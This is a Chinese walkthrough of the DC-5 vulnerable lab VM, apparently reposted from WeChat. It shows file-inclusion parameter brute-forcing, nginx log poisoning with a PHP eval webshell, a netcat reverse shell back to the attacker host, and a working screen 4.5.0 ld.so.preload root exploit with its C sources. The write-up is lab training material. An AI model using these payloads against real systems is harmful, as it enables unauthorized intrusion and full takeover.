> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/E6sSfm2Ui7V1lrnwCRNdCA)

**01 项目安装**
-----------

先把 DC-5 的靶机安装到本地

下载地址是：https://www.five86.com/dc-5.html

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJuqN6SFjSMibm0PwD9F3j8d416tpxL7ThNyRAfcib7CWuiaReTs1xdqKtA/640?wx_fmt=png)

进入页面点击`here` 进行下载

下载好之后，导入咱们的虚拟机

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJfGy1KrcTuJDtB8xEvwj3FMxQdXD5LCnrluBTRmkqcvQB6Kyib1MwOBQ/640?wx_fmt=png)

看到这个页面，表示我们靶机安装成功

**02 信息收集**
-----------

首先我们进行信息收集，获取靶机的 ip 和相关端口

```
#获取ip地址
netdiscover -r  192.168.1.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJIyKBsicQrMP8xyanWcEPeGdYqxEs3TGKDAV9EJmrQL6iaQVP3Qc2wnZQ/640?wx_fmt=png)

知道了 ip，看下靶机开放了哪些端口

```
#获取端口
nmap 192.168.1.119
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJo3gqDGNR8d2XwkIbbq93FAwGNLoicjFzQU4wAmAaA3z31dTSjjZP1QQ/640?wx_fmt=png)

可以看到靶机开启了 80 端口，页面访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJe377iaSLCgZwTmqn0cFSfUzyjOGMYBRwcgUn5eW5BLKtolNeV0smjfQ/640?wx_fmt=png)

访问成功

**03 文件包含**
-----------

在页面中多浏览一下，发现 Contact 模块下可以输入内容，于是尝试多输入几次之后，发现了有意思的地方

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJeJMPaUjDUFic5VaFyHibIadKBnqiaKan8iagtBD1gdM6IV3erevicpicB5FA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJ43pGEpy794luVFoTKGE2iaVowWmgxZ9iaugLY94aicEomQOeovic65kgKw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJJ2s2rj8IckhzFXxCg8kwohKIfBhTRjsSBwCuGDXgkDToSicsHb1RjTw/640?wx_fmt=png)

可以看到相同的页面，只是局部发生了改变，说明这里使用了文件包含

首先进行目录扫描，看是否能够找到这个包含的文件

执行

```
python dirsearch.py -u http://192.168.1.119/solutions.php -e*
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJkKJDvjictxXPL7HWP9xiahOic5XvlvgvScibJxiadKP2OB60cTGWljicDheA/640?wx_fmt=png)

可以看到这个脚本是`footer.php`

**04 文件爆破**
-----------

既然知道了这个脚本，现在需要知道 thankyou.php 是如何把 footer.php 包含的

我们需要用 bp 进行爆破一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJjBfvAj9nNXxmkqF2Hw16UE1qouxn9OCvAxibGERFswicUGOBNQM5wL0A/640?wx_fmt=png)

需要将参数名爆出来

爆出啦参数名为 `file`

所以完整的地址为

> http://192.168.1.119/thankyou.php?file=footer.php

**05 漏洞利用**
-----------

直接将 footer.php 改为 / etc/passwd

> http://192.168.1.119/thankyou.php?file=/etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJBgGL5dR99TeiapVLr4w7VYF0GJbqNOQiaCHznLOSzVb5P0JO9oSBQ6oQ/640?wx_fmt=png)

可以看到直接把账户名读了出来

既然可以读取密码文件，那也可以读取日志文件，方便我们读取木马文件

说到这里就是考验我们密码字典强大的时候，我们需要把日志文件爆破出来

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJ09semGbh8kCCCWYGchbEW8YFDOxL7nOHZt46TL6CfcicnicUkyu5fGHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJzxRerWMiaRmQAQlcIvZQ3So0wY9sZkzOGZSciaSI2ovGQHLoHW81NvsA/640?wx_fmt=png)

可以看到直接把 nginx 的日志爆了出来

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJYOHM9jBM9IibOsa7O7dc2hyuq0ic4aFU7MF0mxVh1aeCc24U61HFPsnA/640?wx_fmt=png)

接下来就是把木马写入日志中，然后用蚁剑直接进行连接

首先尝试用`phpinfo()`是否可以读取成功

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJYOHM9jBM9IibOsa7O7dc2hyuq0ic4aFU7MF0mxVh1aeCc24U61HFPsnA/640?wx_fmt=png)

访问

> http://192.168.1.119/thankyou.php?file=/var/log/nginx/access.log

tip：要是发现没弹出 phpinfo 的信息，建议重装靶机，不要觉得是操作上的问题，真的是靶机问题，（这个地方卡我很久）

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJJHbJR5VGOb8OfRoHRpUUrWwib9RusQq53rAzUOSlg6GECc7GR6UODWg/640?wx_fmt=png)

看到信息弹出，开始写入木马

> <?php @eval($_POST[777]) ; ?>

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJgtDGdf9Tg6DWg829mdxsj2GRhrYnDmAfL3uZxCicbDEdLyhNqfuWOiaQ/640?wx_fmt=png)

然后使用蚁剑进行连接

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJPOYMLChiaiaG7Nz5cQ1JVuPx9ch8jSTECe9GzDhapfPyKDuSAHJYKQpw/640?wx_fmt=png)

链接成功

接下来反弹 shell

kali 执行

```
nc -lvvp 888
```

靶机执行

```
nc -e /bin/sh 192.168.1.116 888
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJOibFcq5GGTCYRuyLDpeJaCTqJ2OMJQU3Bvic9xKDWDFgM7I1J45MMeBg/640?wx_fmt=png)

执行

```
#获取完全交互的shell
python -c  'import pty;pty.spawn ( "/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJbDH9wreFmu3tee7oiclkUV74oAcpntjUBEZArkeUax83T7tLv4MhmKg/640?wx_fmt=png)

**06 提权**
---------

```
#通过find提权，查看用root权限运行的命令
find / -perm -4000 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJ8XlCjH2zAHg1uYTwoKGHfUOqT0tHTvbkzyxKwQiaUVgrYSlCaSOpLuQ/640?wx_fmt=png)

可以看到 / bin/screen-4.5.0

在 kali 中执行

```
searchsploit screen 4.5.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJRMYD5BQLKZATZ72V3icicoe6ptgjfVMTS0zMrJbQLhyeVGxicoiaNXSr4w/640?wx_fmt=png)

可以看到有两个漏洞利用，这里我们使用`linux/local/41154.sh`脚本

进入目录看下脚本

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJcIA2ItwSf6G2FoUGeVxAHhZ69oEvoTAFGjJY2V4tBWh72u0vGsSRcg/640?wx_fmt=png)

这个脚本主要由三部分组成，原本是直接执行脚本，可惜这个脚本有问题，所以需要创建 2 个文件，把每个代码块单独拿出来执行

才可以

1.  创建第一个文件，并复制一下代码块
    

> vi libhax.c

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

2.  创建第二个文件，复制第二个代码块
    

> vi rootshell.c

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJMHtPuupST7fMXCicFFL72ercjrcxMl18Qf2RPGnMfqkMGplpfXA2m1w/640?wx_fmt=png)

3.  编译文件
    

> gcc -fPIC -shared -ldl -o libhax.so libhax.c
> 
> gcc -o rootshell rootshell.c

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJdC8MOxQ0LEBRnUIpkY98faADYic4eP8Lm5AGvyOM3zicgEB242p83lTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJNwPQnAWYPibYD0IWOVQd1MqSDqUjo1BpoYQK2d9RB9icuDW1EbmWB08Q/640?wx_fmt=png)

可以看到本地生成了两个文件

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJeh9tnuL8AUOaFice1fB0t3wbHMrdqSMg5Ix17pFOgxl715jkKRKGK1g/640?wx_fmt=png)

将这两个文件通过 http 上传到靶机当中

在 kali 中执行

```
python -m SimpleHTTPServer 8000
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJBkTzx2E3vxKDC5icmryOrcNcgO6h8iaBWbYD2yzBIibKuhJUKpySlJsLw/640?wx_fmt=png)

在蚁剑中通过 wget 下载下来

> http://192.168.1.116:8000/libhax.so

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJcLZNO7iag1JcEELndG6VbKvxSkdWNprmlXPpJ01iaWbRicjJyvgW2QmKg/640?wx_fmt=png)

> http://192.168.1.116:8000/rootshell

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJ1jg4OLqtHibFUSe16mdSYMhn2z2pZvNIUt6beUEHVYGl9dHrlO1HNaA/640?wx_fmt=png)

可以看到靶机有两个文件

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJMO2RkzfibHqW9YQMVhgquAabWHf4FMhJYD4P5qfXP4LS0NZNXZibO7fQ/640?wx_fmt=png)

执行之前脚本的第三个代码块，依次执行下面每条语句

```
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen –ls
/tmp/rootshell
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJmiaSpDN09yqCBZTerojMiaetgEYNAgXe223vzZphXutKKEynajj9JpVg/640?wx_fmt=png)

发现提权成功

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MbfibDppX0fl1hEiaNu2tgFcJmiaSpDN09yqCBZTerojMiaetgEYNAgXe223vzZphXutKKEynajj9JpVg/640?wx_fmt=png)

最终拿到 flag

**07 总结**
---------

1.  通过包含漏洞获取信息，以及执行木马
    
2.  通过 bp 爆破获取参数名称，以及服务器日主文件
    
3.  熟悉 searchsploit，找到已知漏洞